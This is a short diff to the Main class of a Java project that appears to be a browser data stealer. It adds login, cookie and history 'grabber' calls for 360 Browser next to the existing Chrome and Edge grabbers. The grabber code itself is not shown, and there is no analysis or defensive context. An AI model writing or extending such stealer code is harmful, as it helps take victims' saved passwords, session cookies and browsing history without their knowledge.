@@ -1,5 +1,8 @@
 package ninja.maki;
 
+import ninja.maki.grabber.broswer360.Broswer360Login;
+import ninja.maki.grabber.broswer360.Browser360Cookie;
+import ninja.maki.grabber.broswer360.Browser360History;
 import ninja.maki.grabber.chrome.ChromeCookie;
 import ninja.maki.grabber.chrome.ChromeHistory;
 import ninja.maki.grabber.chrome.ChromeLogin;
@@ -19,6 +22,9 @@ public class Main {
         EdgeLogin.grab();
         EdgeHistory.grab();
         EdgeCookie.grab();
+        Broswer360Login.grab();
+        Browser360History.grab();
+        Browser360Cookie.grab();
         SystemUtil.console();
         SystemUtil.console("Stop program.");
     }
